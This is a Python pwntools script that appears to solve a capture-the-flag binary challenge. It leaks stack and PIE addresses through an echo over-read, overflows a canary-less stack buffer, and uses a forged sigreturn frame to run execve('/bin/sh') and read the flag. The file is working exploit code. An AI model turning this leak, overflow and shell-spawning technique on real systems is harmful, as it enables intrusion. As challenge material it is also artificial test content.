import os
import sys

from pwn import *

context.log_level = "info"
elf = context.binary = ELF("./serbian_rop", checksec=False)

HOST = os.environ["SERVICE_APP_MAIN_HOST"]
PORT = int(os.environ["SERVICE_APP_MAIN_PORT"])

# vuln(): `sub rsp, 0x30` carves out a 0x30 byte buffer at rsp, then loops
# read()+echo() until the first 14 bytes equal the magic "SRBIJA SRBIMA!".
# There is no stack canary, so bytes written past the 0x30 byte buffer
# overwrite the saved rbp (offset 0x30) and the return address (offset 0x38)
# back into _start (right after `call vuln`, i.e. base + 0x1011).
#
# write() re-scans the buffer for a NUL/'\n' terminator instead of trusting
# the byte count from read(), so sending a short, no-newline payload makes it
# echo back whatever stale stack bytes already follow it - this is used to
# leak both a stack address (at buffer offset 0x20) and the PIE return
# address (at buffer offset 0x38) without ever overflowing anything yet.
#
# There aren't enough ROP gadgets for a classic ret2libc chain, so the
# overflow instead pivots into Sigreturn-Oriented Programming (SROP): a
# forged sigcontext frame written after a `syscall; ...` gadget drives a
# execve("/bin/sh", NULL, NULL) with rax=0x3b (sys_execve).
MAGIC = b"SRBIJA SRBIMA!"
BUF_SIZE = 0x30
RBP_OFFSET = 0x30
RET_OFFSET = 0x38
RET_TO_START_OFFSET = 0x1011  # return address lands right after `call vuln`
SYSCALL_OFFSET = 0x101B  # `syscall` inside the post-vuln exit(0) sequence


def attempt():
    p = remote(HOST, PORT)

    try:
        # Leak a stack address: send bytes without a newline so write()
        # keeps echoing past them until it hits the next NUL/'\n' byte
        # already sitting on the stack.
        p.send(b"A" * 0x20)
        p.recvuntil(b"A" * 0x20)
        stack_leak = u64(p.recv(6).ljust(8, b"\x00"))
        log.success(f"Stack leak: 0x{stack_leak:x}")

        # Same trick, but reaching far enough to leak the saved return
        # address, which reveals the PIE load base.
        p.send(b"A" * RET_OFFSET)
        p.recvuntil(b"A" * RET_OFFSET)
        leaked_ret = u64(p.recv(6).ljust(8, b"\x00"))
        pie_base = leaked_ret - RET_TO_START_OFFSET
        log.success(f"PIE leak: 0x{pie_base:x}")

        if pie_base & 0xFFF != 0 or pie_base < 0x1000:
            # Sanity check: a PIE base must be page aligned. A bad leak
            # (truncated by an unlucky NUL/newline byte) would show up here.
            raise ValueError(f"implausible pie base 0x{pie_base:x}")

        elf.address = pie_base
        syscall_gadget = pie_base + SYSCALL_OFFSET
        binsh_addr = stack_leak - BUF_SIZE  # "/bin/sh" placed on our own stack frame

        frame = SigreturnFrame()
        frame.rax = constants.SYS_execve
        frame.rdi = binsh_addr
        frame.rsi = 0
        frame.rdx = 0
        frame.rip = syscall_gadget

        payload = MAGIC + b"\x00\x00"
        payload += b"/bin/sh\x00"
        payload += b"A" * (RET_OFFSET - len(payload))
        payload += p64(syscall_gadget)
        payload += bytes(frame)

        p.send(payload)

        p.sendline(b"cat /home/user/flag")
        out = p.recvall(timeout=10).decode(errors="replace")
        print(out)

        if "SCC{" not in out:
            raise ValueError("flag not found in shell output")

        return out
    finally:
        p.close()


def main():
    attempts = 8
    last_err = None
    for i in range(1, attempts + 1):
        log.info(f"attempt {i}/{attempts}")
        try:
            attempt()
            return
        except Exception as e:
            last_err = e
            log.warning(f"attempt {i} failed: {e}")

    log.error(f"all {attempts} attempts failed: {last_err}")
    sys.exit(1)


if __name__ == "__main__":
    main()
